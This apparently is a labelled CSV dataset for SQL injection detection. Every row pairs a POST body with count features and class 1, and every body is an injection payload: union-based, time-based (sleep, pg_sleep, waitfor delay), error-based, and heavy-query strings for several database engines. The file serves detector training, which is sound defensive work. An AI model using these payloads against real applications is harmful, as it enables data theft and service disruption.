method,body,class,single_q,double_q,dashes,braces,spaces,badwords,path
POST,1'  )   as znak where 5203  =  5203,1,1,0,0,1,12,2,
POST,-2348  )   as sige where 1639  =  1639 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,0,0,4,33,168,7,
POST,"1   )    )    as qgok where 3993  =  3993 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1,0,0,3,6,42,4,
POST,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""koni"" like ""koni",1,2,4,0,4,27,4,
POST,"-1748%""   )    )     )   union all select 2987#",1,0,1,1,3,18,3,
POST,"1   )    )    as jzzo where 7773  =  7773 union all select null,null,null,null,null#",1,0,0,0,2,22,5,
POST,"-8344 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- wjpa",1,0,0,4,34,160,3,
POST,"1%""   )    )     )   union all select null,null,null,null,null,null,null#",1,0,1,0,3,18,3,
POST,"1  )   where 3738  =  3738 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,0,0,3,7,45,5,
POST,"select * from generate_series  (  6414,6414,case when   (  6414  =  6455  )   then 1 else 0 end  )   limit 1--",1,0,0,3,4,32,3,
POST,"1""   )    )    as spvl where 2242  =  2242 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",1,0,1,3,6,45,5,
POST,"1  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  4557  =  4557",1,0,0,0,6,47,9,
POST,"1%""   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,0,1,0,14,64,1,
POST,1'+  (  select bjav where 6923  =  6923 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,1,0,0,9,50,7,
POST,"-8633"" or 5099  =  5974",1,0,1,1,0,6,1,
POST,end and 'hizd'  =  'hizd,1,3,0,0,0,6,1,
POST,"1"" and   (  1668  =  8054  )  *8054",1,0,1,0,2,14,1,
POST,-1643' where 1968  =  1968 or 3484  =  6642,1,1,0,1,0,12,2,
POST,"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'gxgi'  =  'gxgi",1,4,0,0,20,96,2,
POST,"1"" where 5236  =  5236 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1,0,1,3,16,76,2,
POST,"1'||  (  select 'yags' where 6268  =  6268 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   ||'",1,4,0,0,6,48,9,
POST,"1""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""qpzj"" like ""qpzj",1,0,4,0,12,58,4,
POST,"1'  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,1,0,0,13,58,1,
POST,"1 where 9898  =  9898 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,0,0,3,34,165,4,
POST,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'vcgc' like 'vcgc",1,3,0,0,5,35,8,
POST,"1""  )   where 2070  =  2070",1,0,1,0,1,10,1,
POST,"-9142%""   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  """,1,0,4,1,40,193,4,
POST,"1"" and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,0,1,3,4,31,7,
POST,"-8933  )   as iiyr where 1974  =  1974 union all select 1974,1974,1974,1974,1974#",1,0,0,1,1,16,5,
POST,1'  )   as gdie where 8133  =  8133 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1,1,0,3,7,52,3,
POST,1'||  (  select 'puco' where 2605  =  2605 union all select null#,1,3,0,0,1,15,5,
POST,"1%""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""%""  =  """,1,0,4,0,10,67,9,
POST,"1"" or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,0,1,3,10,46,2,
POST,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,1,4,0,0,8,52,3,
POST,"1'+  (  select uqdb where 3508  =  3508 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,0,3,5,42,9,
POST,"-3437  )   union all select 7774,7774,7774--",1,0,0,4,1,8,3,
POST,select   (  case when   (  2914  =  3335  )   then 2914 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,0,0,3,8,51,5,
POST,-6341' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'ugys'  =  'ugys,1,8,0,1,4,39,4,
POST,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""nwjv""  =  ""nwjv",1,0,3,0,9,43,1,
POST,"1"" where 7249  =  7249 union all select null,null,null,null,null,null,null,null,null,null--",1,0,1,3,0,10,4,
POST,"-1097"" where 4421  =  4421 union all select 4421,4421,4421,4421,4421#",1,0,1,1,0,10,4,
POST,"1%""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""%""  =  """,1,0,4,0,12,60,3,
POST,-8274'   )    )    union all select 3048--,1,1,0,4,2,14,3,
POST,-6203'   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'luee'  =  'luee,1,4,0,1,36,178,5,
POST,"1' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'nazb'  =  'nazb",1,4,0,0,18,100,8,
POST,"1'  )   where 8835  =  8835 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,3,0,3,9,52,3,
POST,"-5581%'   )    )     )   union all select 4266,4266,4266,4266,4266,4266,4266,4266,4266,4266#",1,1,0,1,3,18,3,
POST,select sleep  (  5  )   and 'mlmu'  =  'mlmu,1,3,0,0,2,15,3,
POST,"1' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'jmub'  =  'jmub",1,4,0,0,4,39,9,
POST,"-3960""   )    )    union all select 7813,7813,7813,7813,7813,7813--",1,0,1,4,2,14,3,
POST,"1  )   where 6082  =  6082 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,0,0,3,19,101,10,
POST,"-7793""   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  ""lias""  =  ""lias",1,0,4,1,8,48,2,
POST,"1' where 6853  =  6853 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,1,0,3,14,79,7,
POST,"1%""   )    )   ",1,0,1,0,2,10,0,
POST,1'+  (  select 'yyyn' where 5395  =  5395,1,3,0,0,1,11,2,
POST,1'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'sgdj' like 'sgdj,1,4,0,0,30,146,6,
POST,"1%"" and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""%""  =  """,1,0,4,0,38,183,7,
POST,"-3359 union all select 4675,4675,4675--",1,0,0,4,0,4,3,
POST,"1""  )   where 9545  =  9545 and 9198  =  9198--",1,0,1,3,1,16,2,
POST,"1'   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'luoj'  =  'luoj",1,4,0,0,18,99,7,
POST,"-9263'  )   as qodg where 6798  =  6798 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,1,0,4,31,154,6,
POST,-1011 or 7140  =  9977--,1,0,0,4,0,6,1,
POST,select   (  case when   (  3539  =  8768  )   then 3539 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,0,0,3,8,51,5,
POST,"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'hfxu' like 'hfxu",1,4,0,0,6,42,6,
POST,1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   # pkcp,1,0,0,0,4,28,3,
POST,1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'yctp'  =  'yctp,1,4,0,0,14,73,6,
POST,"1""  )   where 2388  =  2388 union all select null,null,null,null,null,null,null,null,null--",1,0,1,3,1,14,4,
POST,"1""  )   union all select null,null,null--",1,0,1,3,1,8,3,
POST,"1""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""tepf""  =  ""tepf",1,0,4,0,24,125,10,
POST,"1' union all select null,null--",1,1,0,3,0,4,3,
POST,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,1,0,0,18,91,9,
POST,"-8436'  )   as frmf where 7225  =  7225 or make_set  (  9354  =  9354,7185  )  --",1,1,0,4,3,26,3,
POST, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  'pfle' like 'pfle,1,3,0,0,11,54,6,
POST,"1""  )   as uyns where 4751  =  4751 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --",1,0,1,3,9,51,7,
POST,"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'ifca' like 'ifca",1,4,0,0,4,26,3,
POST,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",1,0,1,4,2,22,5,
POST,"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""tuhy"" like ""tuhy",1,2,4,0,6,35,4,
POST,"1'  )   where 3330  =  3330 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,0,3,5,43,9,
POST,"1'  )   where 9226  =  9226 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,0,3,5,40,5,
POST,"1""   )    )    as uqkn where 4642  =  4642 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1,0,1,3,6,42,3,
POST,"1'  )   union all select null,null,null,null,null,null,null#",1,1,0,0,1,8,3,
POST,"1""   )    )    as knyf where 8109  =  8109 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,2,1,3,10,60,4,
POST,"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'ccsb'  =  'ccsb",1,4,0,0,4,36,5,
POST,"1   )    )    as pjjz where 8384  =  8384 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1,0,0,3,12,69,4,
POST,"1'  )   as uytv where 7875  =  7875 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,0,3,5,43,9,
POST,"select * from generate_series  (  3341,3341,case when   (  3341  =  3072  )   then 1 else 0 end  )   limit 1--",1,0,0,3,4,32,3,
POST,"-4407""  )   where 2055  =  2055 or elt  (  9714  =  5040,5040  )  --",1,0,1,4,3,24,2,
POST,"-5898""   )    )    as fycd where 7135  =  7135 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,0,1,4,36,177,5,
POST,"1"" where 8978  =  8978 union all select null,null,null,null,null,null,null,null--",1,0,1,3,0,10,4,
POST,"1'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,0,3,6,43,8,
POST,"1'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   'stqq'  =  'stqq",1,4,0,0,14,72,3,
POST,1%',1,1,0,0,0,0,0,
POST,"1   )    )    as vycb where 3524  =  3524 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,0,0,3,6,51,10,
POST,"-3731'   )    )     )   or elt  (  7540  =  1412,1412  )   and    (    (     (  'iwch'  =  'iwch",1,4,0,1,8,48,2,
POST,"1""   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""zzcd""  =  ""zzcd",1,0,4,0,10,65,8,
POST,-2951 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  # gwqv,1,0,0,1,38,178,6,
POST,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   6977  =  6977",1,0,0,0,4,35,8,
POST,"1""  )   as pkkx where 6716  =  6716 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,0,1,3,11,61,4,
POST,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,3,0,3,9,54,4,
POST,1'   )    )    as zffq where 9572  =  9572 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1,1,0,3,6,45,5,
POST,"1  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,0,0,0,19,98,7,
POST,"1'  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,0,3,17,74,1,
POST,"-4746%""   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """,1,0,4,1,36,176,5,
POST,"-1157   )    )    as sxie where 7118  =  7118 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,0,0,4,32,160,6,
POST,"1""  )   and make_set  (  4553  =  8132,8132  )   and   (  ""pfci"" like ""pfci",1,0,4,0,4,26,3,
POST,"-2211"" or 2113  =  8885#",1,0,1,1,0,6,1,
POST,1'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'nfix'  =  'nfix,1,4,0,0,34,168,5,
POST,"-4797' union all select 8223,8223,8223,8223,8223,8223,8223,8223#",1,1,0,1,0,4,3,
POST,"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'efpc' like 'efpc",1,4,0,0,22,107,4,
POST,"1   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  6265  =  6265",1,2,0,0,14,76,3,
POST,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  ""uncg""  =  ""uncg",1,0,4,0,14,73,6,
POST,1%'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  ',1,4,0,0,36,172,4,
POST, (  select   (  case when   (  9337  =  9337  )   then waitfor delay '0:0:5' else 9337*  (  select 9337 from master..sysdatabases  )   end   )    ) ,1,2,0,0,8,48,5,
POST,"1' in boolean mode  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",1,1,0,0,15,80,7,
POST,"-8725""   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  ""vblw"" like ""vblw",1,0,4,1,8,46,3,
POST,1%'   )    ) ,1,1,0,0,2,8,0,
POST,1' and 5835  =  6157 and 'bjee' like 'bjee,1,4,0,0,0,10,3,
POST,"make_set  (  5679  =  9769,9769  )  ",1,0,0,0,2,12,0,
POST,1  )   where 5629  =  5629,1,0,0,0,1,10,1,
POST,"-4528""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""fxmt"" like ""fxmt",1,4,4,1,6,45,5,
POST,-7636'  )   or 5898  =  8880 and   (  'sjuv'  =  'sjuv,1,4,0,1,2,20,2,
POST,"-3747""  )   union all select 8962,8962,8962,8962,8962#",1,0,1,1,1,8,3,
POST,"-8893  )   union all select 7594,7594,7594,7594,7594,7594#",1,0,0,1,1,8,3,
POST,1  )   or sleep  (  5  )   and   (  2211  =  2211,1,0,0,0,4,24,3,
POST,1'||  (  select 'lnhq' where 7526  =  7526,1,3,0,0,1,11,2,
POST,-8513  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  5818  =  5818,1,0,0,1,30,148,5,
POST,1%'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   '%'  =  ',1,4,0,0,8,53,4,
POST,"1""  )   where 4520  =  4520",1,0,1,0,1,10,1,
POST,1' where 8945  =  8945 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,5,0,3,4,39,4,
POST,"1%"" and 7533  =  7533 and ""%""  =  """,1,0,4,0,0,12,2,
POST,"-6996%"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,0,1,1,14,79,6,
POST,"1'||  (  select 'qjwf' from dual where 3187  =  3187 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",1,4,0,0,18,89,4,
POST,"1"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""cdai""  =  ""cdai",1,0,4,0,6,41,5,
POST,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,1,0,0,18,89,8,
POST,"-1258""   )    )    union all select 7734,7734,7734#",1,0,1,1,2,14,3,
POST,1 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   # lexm,1,0,0,0,28,135,4,
POST,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'lywy' like 'lywy",1,4,0,0,18,95,11,
POST,1 where 6518  =  6518,1,0,0,0,0,6,1,
POST,"1%"" and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,1,0,4,0,34,164,4,
POST,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",1,1,0,3,1,14,4,
POST,1' where 5547  =  5547,1,1,0,0,0,6,1,
POST,"1 where 8908  =  8908 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,0,0,3,4,37,8,
POST,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",1,0,1,3,3,22,4,
POST,1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1,0,0,3,4,33,4,
POST,"1',  (  select   (  case when   (  1570  =  1570  )   then   (  select 1570 from pg_sleep  (  5   )    )    else 1/  (  select 0  )   end   )    )   ",1,1,0,0,12,68,4,
POST,"1""  )   where 8095  =  8095 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1,0,1,3,33,166,6,
POST,"-5963"" or 9323  =  9323#",1,0,1,1,0,6,1,
POST,1' where 8584  =  8584 order by 1#,1,1,0,0,0,9,3,
POST,1   )    ) ,1,0,0,0,2,8,0,
POST,"1%'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  '%'  =  '",1,4,0,0,10,65,8,
POST,"1'   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'vtno'  =  'vtno",1,4,0,0,40,193,4,
POST,"1' and elt  (  4249  =  4249,7259  )   and 'awjd'  =  'awjd",1,4,0,0,2,20,2,
POST,"1 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1,0,0,0,6,35,4,
